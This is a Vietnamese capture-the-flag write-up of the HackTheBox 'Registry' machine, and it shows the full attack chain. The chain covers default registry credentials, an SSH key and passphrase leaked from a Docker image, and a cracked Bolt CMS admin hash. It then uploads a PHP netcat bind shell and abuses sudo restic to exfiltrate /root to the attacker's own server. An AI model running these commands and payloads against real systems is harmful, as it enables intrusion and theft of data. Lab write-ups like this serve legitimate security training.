![](https://images.viblo.asia/e1b8cdcd-9942-40c5-80e3-67bc7c276769.png)

## Recon
```sh
➜  ~ ./nmapAutomator.sh 10.10.10.159 all

Running a all scan on 10.10.10.159

Host is likely running Linux



---------------------Starting Nmap Quick Scan---------------------

Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-10 15:50 +07
Nmap scan report for 10.10.10.159
Host is up (0.20s latency).
Not shown: 905 closed ports, 92 filtered ports
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https

Nmap done: 1 IP address (1 host up) scanned in 5.22 seconds



---------------------Starting Nmap Basic Scan---------------------

Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-10 15:50 +07
Nmap scan report for 10.10.10.159
Host is up (0.19s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)
|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)
|_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)
80/tcp  open  http     nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Site doesn't have a title.
443/tcp open  ssl/http nginx 1.14.0 (Ubuntu)
|_http-server-header: nginx/1.14.0 (Ubuntu)
|_http-title: Site doesn't have a title.
| ssl-cert: Subject: commonName=docker.registry.htb
| Not valid before: 2019-05-06T21:14:35
|_Not valid after:  2029-05-03T21:14:35
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up)![](https://images.viblo.asia/02cf4944-af7d-41c1-9dce-edb0c4fa6983.png)
 scanned in 28.38 seconds
```
Mình thấy cert có thông tin
```
ssl-cert: Subject: commonName=docker.registry.htb
```
nên mình thêm vào file `/etc/passwd`
```sh /etc/passwd
10.10.10.159 docker.registry.htb registry.htb
```
Sử dụng `gobuster` recon thư mục
```sh
gobuster dir -u http://docker.registry.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l 40
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://docker.registry.htb
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Show length:    true
[+] Timeout:        10s
===============================================================
2020/02/10 16:09:49 Starting gobuster
===============================================================
/v2 (Status: 301) [Size: 39]
```
Thấy có thư mục `/v2` báo mã `301` thì trang này có gắn basic auth. Thử nhập `admin:admin` vào thì được :v. Có lẽ auth mô phỏng lại lỗi đặt basic auth quá dễ đoán. Sau khi nhập được basic auth thì ở docker có thư mục  `_catalog` để kiểm tra có image gì trong đấy.

![](https://images.viblo.asia/02cf4944-af7d-41c1-9dce-edb0c4fa6983.png)

## Get User
Vậy là ta biết được image tên là gì rồi thì mình pull docker về xem sao.

Nhưng trong lúc mình pull docker về thì gặp lỗi này

```sh
minhtuan@kali:~$ sudo docker pull docker.registry.htb/bolt-image
Using default tag: latest
Error response from daemon: Get https://docker.registry.htb/v2/: x509: certificate signed by unknown authority
```
Hóa ra là mình chưa có certificate. Vậy thì update certificate thủ công thôi Vào https://docker.registry.htb tải file .crt về copy file đấy vào
```sh
/usr/local/share/ca-certificates
sudo update-ca-certificates
sudo service docker restart
```
```sh
minhtuan@kali:~$ sudo docker login https://docker.registry.htb
Username: admin
Password: 
WARNING! Your password will be stored unencrypted in /root/.docker/config.json.
Configure a credential helper to remove this warning. See
https://docs.docker.com/engine/reference/commandline/login/#credentials-store

Login Succeeded
```
Thành công, lúc này ta có thể pull docker về và sử dụng bình thường rồi.

```sh
➜  ~ docker pull docker.registry.htb/bolt-image
Using default tag: latest
latest: Pulling from bolt-image
Digest: sha256:eeff225e5fae33dc832c3f82fd8b0db363a73eac4f0f0cb587094be54050539b
Status: Image is up to date for docker.registry.htb/bolt-image:latest
docker.registry.htb/bolt-image:latest
```
Pull về xong rồi thì chui vào thôi
```sh
➜  ~ docker run --rm -it docker.registry.htb/bolt-image:latest
root@9818304f783b:/# 
```
Kinh nghiệm của mình là cứ tập trung vào những folder nào nó cực kỳ nhạy cảm như `ssh`, rồi mấy thư mục của `user`, `/var/www/html` xem có gì không. Lục mãi thì trong thư mục `/root/.ssh` có file private key ssh. Sử dụng `ssh2john.py` và `john` brute force lấy pass private key nhưng mà k được. Nên mình quay lại docker xem bên trong còn gì nữa không. Sau một hồi tìm kiếm lùng sục thì mình thấy có 1 file này ở đây.
```sh
root@9818304f783b:/etc/profile.d# cat 01-ssh.sh 
#!/usr/bin/expect -f
#eval `ssh-agent -s`
spawn ssh-add /root/.ssh/id_rsa
expect "Enter passphrase for /root/.ssh/id_rsa:"
send "GkOcz221Ftb3ugog\n";
expect "Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)"
interact
```
Vậy đây là đoạn chương trình tạo khóa private key. Mật khẩu file `id_rsa` kia là `GkOcz221Ftb3ugog`. Việc còn lại là mình ssh vào machine thôi.
```sh
➜  registry ssh -i id_rsa root@10.10.10.159      
Enter passphrase for key 'id_rsa': 
root@10.10.10.159's password: 
```
K được. Cơ mà mình hơi ngây thơ, ssh vào root thì bài này đã dễ quá =)). Xong mình nhìn lại cái tên image docker là `bolt-image`. Thử sử dụng user ssh là `bolt` xem sao.

```sh
➜  registry ssh -i id_rsa bolt@10.10.10.159
Enter passphrase for key 'id_rsa':
Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)

  System information as of Mon Feb 10 09:35:17 UTC 2020

  System load:  0.0               Users logged in:                1
  Usage of /:   5.7% of 61.80GB   IP address for eth0:            10.10.10.159
  Memory usage: 32%               IP address for br-1bad9bd75d17: 172.18.0.1
  Swap usage:   0%                IP address for docker0:         172.17.0.1
  Processes:    173
Last login: Mon Feb 10 09:06:21 2020 from 10.10.16.7
bolt@bolt:~$ 
user.txt
```
Và chúng ta có user
## Get Root
Mình sử dụng private key để đăng nhập vào ssh của **bolt** nên mình chưa thể sử dụng sudo right để leo thang đặc quyền được vì khi gõ `sudo -l` hệ thống sẽ yêu cầu nhập mật khẩu của **bolt**. Mình đã sử dụng `LinEnum.sh` để khai thác ở user bolt này nhưng chưa thu được kết quả gì. Sau một hồi tìm tòi và thử, điều khiến cho mình tập trung tiếp là vào phần web. Mình tìm thấy được trong thư mục web có thư mục `/bolt`.

![](https://images.viblo.asia/5f69fe28-9e40-4c19-87d1-f46fd06aae0f.png)

Trang này được tạo bởi Bolt CMS, là 1 opensource. Thử http://registry.htb/bolt/bolt thì vào được trang login. Công cuộc tiếp theo thì tìm kiếm account admin đăng nhập vào đây thôi. Lục tiếp trong folder `/var/www/html/bolt` thì có 1 file db.
```sh
bolt@bolt:/var/www/html/bolt/app/database$ ls
bolt.db
bolt@bolt:/var/www/html/bolt/app/database$ file bolt.db 
bolt.db: SQLite 3.x database, last written using SQLite version 3022000
```
Check file thì đây là 1 file db SQLite 3. Tiếc là trên machine lại k có sqlite3 nên mình copy file này về máy để kiểm tra. Sử dụng scp để copy file bolt.db về máy mình
```sh
➜  registry scp -i id_rsa bolt@10.10.10.159:/var/www/html/bolt/app/database/bolt.db .
```
Sau khi đã copy xong file thì mình chui vào xem trong đó có gì, mình tìm thấy tài khoản admin ở trong bảng `bolt_users`
```sh
➜  registry sqlite3 bolt.db
SQLite version 3.31.0 2019-12-29 00:52:41
Enter ".help" for usage hints.
sqlite> .table
bolt_authtoken    bolt_field_value  bolt_pages        bolt_users      
bolt_blocks       bolt_homepage     bolt_relations  
bolt_cron         bolt_log_change   bolt_showcases  
bolt_entries      bolt_log_system   bolt_taxonomy   
sqlite> select * from bolt_users 
   ...> ;
1|admin|$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK|bolt@registry.htb|2020-02-09 23:27:11|10.10.15.117|Admin|["themes://basic.php","themes://rev.php","themes://base-2018/meh.twig","themes://meh.twig","themes://shell.php"]|1||||0||["root","everyone"]
sqlite> 
```
Sử dụng john để crack passwd admin ra được passwd là `strawberry`, đăng nhập vào http://registry.htb/bolt/bolt. Ở đây có 1 trình upload file, ta thử upload file shell lên đây nhưng mà nó k cho upload file php lên.

![](https://images.viblo.asia/caa1a8a0-d682-402f-aa24-1f84dd17e964.png)

Sửa 1 chút config ở đây để server cho phép upload file php

![](https://images.viblo.asia/db62738d-825e-4a7c-b4ff-cc26a96f558e.png)

![](https://images.viblo.asia/9f2d8446-18e2-4007-bce2-0eb3c7973c71.png)

Sau đấy ta lưu lại rồi chuyển sang chức năng upload đẩy shell lên. Ban đầu mình sử dụng https://github.com/flozz/p0wny-shell nhưng mà mình k thể reverse shell lại máy mình được.  Mình đã chuyển hướng sang sử dụng bind shell để RCE. Sử dụng file shell.php
```php
<?php system("nc.traditional -lvp 4444 -e /bin/bash");
```
Upload lên rồi bên máy mình sử dụng lệnh

```sh
➜  registry nc -nv 10.10.10.159 4444
(UNKNOWN) [10.10.10.159] 4444 (?) open
```
Upgrade lên pty shell
```sh
python -c 'import pty; pty.spawn("/bin/bash")'
```
Đến đây rồi lại tiếp tục sử dụng **LinEnum.sh** để kiểm tra xem có gì không thì mình thấy cái này
```sh
[+] We can sudo without supplying a password!
Matching Defaults entries for www-data on bolt:
    env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on bolt:
    (root) NOPASSWD: /usr/bin/restic backup -r rest*
```

Tập trung hết cơm gạo vào phần này để lấy root =)).

Giới thiệu sơ qua một chút, **restic** là 1 opensource sử dụng để backup, nói rõ hơn thì mình cũng chịu vì cái này quá mới so với mình =)), chả biết gì cả.

Ngồi đọc document của nó tại đây https://restic.readthedocs.io/en/latest/ Sau một khoảng thời gian đọc doc với lên mạng tìm exam câu lệnh của nó thì mới biết là nó cần 1 server để backup. Người bạn chơi cùng mình bảo là nó có 1 restic server, nó tự động chạy trên cổng 8000. Mình ngồi tải file binary của nó ở đây https://github.com/restic/rest-server/releases

```sh
➜  Downloads ./rest-server-0.9.7-linux-amd64 
rest-server 0.9.7 compiled with go1.10 on linux/amd64
Data directory: /tmp/restic
Authentication disabled
Private repositories disabled
Starting server on :8000
```
Chạy server xong thì tạo repo restic để lưu file backup

```sh
➜  Downloads apt-get install restic 
➜  Downloads restic init -r /tmp/restic
enter password for new repository: 
enter password again: 
created restic repository 03ab053496 at /tmp/restic

Please note that knowledge of your password is required to access
the repository. Losing your password means that your data is
irrecoverably lost.
```
Thực hiện remote port forwarding lên machine
```sh
➜  registry ssh -i id_rsa -R 8000:127.0.0.1:8000 bolt@10.10.10.159
```
Sử dụng restic với quyền sudo backup thư mục `/root`
```sh
www-data@bolt:~/html$ sudo /usr/bin/restic backup -r rest:http://127.0.0.1:8000 /root
<n/restic backup -r rest:http://127.0.0.1:8000 /root
enter password for repository: 123123

password is correct
found 2 old cache directories in /var/www/.cache/restic, pass --cleanup-cache to remove them
scan [/root]
scanned 10 directories, 14 files in 0:00
[0:01] 100.00%  28.066 KiB / 28.066 KiB  24 / 24 items  0 errors  ETA 0:00 
duration: 0:01
snapshot e5ef88b3 saved
www-data@bolt:~/html$ 
```
Ngon, lưu snapshot được về máy mình rồi, điều quan trọng giờ là tìm lệnh để đọc nó ra thôi. Ngồi cat mấy cái folder trong `/tmp/restic` mà nó mã hóa hết luôn. Ngồi đọc doc thấy đoạn này, hóa ra là nó dùng restore chứ nó k phải kiểu mở ra rồi đọc được.

![](https://images.viblo.asia/0acb1101-eaf6-4f50-98c5-43d6c84a21dc.png)

```sh
➜  restic restic -r /tmp/restic restore e5ef88b3 --target /tmp/restic-root 
enter password for repository: 
repository 03ab0534 opened successfully, password is correct
restoring <Snapshot e5ef88b3 of [/root] at 2020-02-10 06:26:17.454661805 +0000 UTC by root@bolt> to /tmp/restic-root
```
Xong rồi, vào `/tmp/restic-root` lấy cờ cuối thôi ;))
```sh
➜  restic cd /tmp/restic-root 
➜  restic-root ;s
zsh: command not found: s
➜  restic-root ls
root
➜  restic-root cd root            
➜  root ls
config.yml  cron.sh  root.txt
```
## Thanks
Cảm ơn 2 thành viên trong team mình đã giúp đỡ mình trong lúc chơi ;)
- Nguyen Van Khanh B
- Nguyen Xuan Hoa

Hy vọng bài writeup của mình sẽ có thể giúp đỡ các bạn điều gì đó. Cảm ơn các bạn đã đọc đến đây. Mình sẽ ra những bài Writeup Hackthebox khi machine được đóng. Cùng theo dõi mình nhé.